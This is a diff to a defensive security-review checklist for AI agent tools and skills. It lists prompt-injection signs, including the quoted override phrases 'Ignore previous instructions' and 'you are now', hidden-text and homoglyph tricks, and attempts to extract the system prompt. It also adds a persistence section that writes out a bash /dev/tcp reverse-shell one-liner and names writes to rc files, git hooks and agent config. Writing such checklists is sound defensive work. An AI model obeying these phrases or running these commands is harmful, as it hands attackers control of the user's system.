@@ -52,21 +52,34 @@ The dangerous combination is **read a secret** + **send it somewhere**.
 - MCP servers from unknown sources, or granting a server broad scope.
 - Dependencies added quietly in a change that is ostensibly about something else.
 
-## Prompt injection in content
+## Prompt injection in content (direct and indirect)
 
 - "Ignore previous / all instructions", "you are now…", "system:", role
   overrides.
 - Instructions addressed to the AI/assistant/agent inside data the agent is only
-  meant to read (web page, PDF, issue, email, code comment, commit message).
+  meant to read (web page, PDF, issue, PR, email, ticket, code comment, commit
+  message, tool output).
 - Hidden text: white-on-white, `font-size:0`, off-screen CSS, HTML comments,
-  zero-width characters, alt-text, metadata.
-- Content that asks the agent to reveal its system prompt, disable safety checks,
-  run a command, open a URL, install something, or read/transmit secrets.
+  alt-text, metadata.
+- Disguised characters: zero-width characters, and homoglyphs — look-alike
+  Unicode letters (e.g. Cyrillic `а`/`е`/`о`) used to sneak instructions or
+  typosquat a name past a quick read.
+- Content that asks the agent to reveal its system prompt, tool definitions, or
+  context (system-prompt leakage), disable safety checks, run a command, open a
+  URL, install something, or read/transmit secrets.
 - Multi-step laundering: "first summarize, then as step two run this command."
+
+## Persistence / footholds
+
+- Reverse shells: `bash -i >& /dev/tcp/HOST/PORT 0>&1`, `nc -e`, `python`
+  socket-to-shell one-liners.
+- Writes to shell rc files (`.bashrc`, `.zshrc`, `.profile`, `.bash_profile`),
+  `git` hooks (`.git/hooks/`), cron, launch agents/daemons, systemd units.
+- Modifying agent config or memory: `~/.claude`, `CLAUDE.md`, MCP config, or
+  editor/agent settings so behavior changes on future runs.
 
 ## Access scope mismatches
 
 - A skill/tool reading or writing far outside its stated purpose.
-- Writes to shell rc files (`.bashrc`, `.zshrc`, `.profile`), `git` hooks,
-  `~/.claude`, cron, launch agents, or system directories.
 - Requests for broad filesystem or permission grants not justified by the task.
+- An install-time or runtime action unrelated to the tool's advertised job.
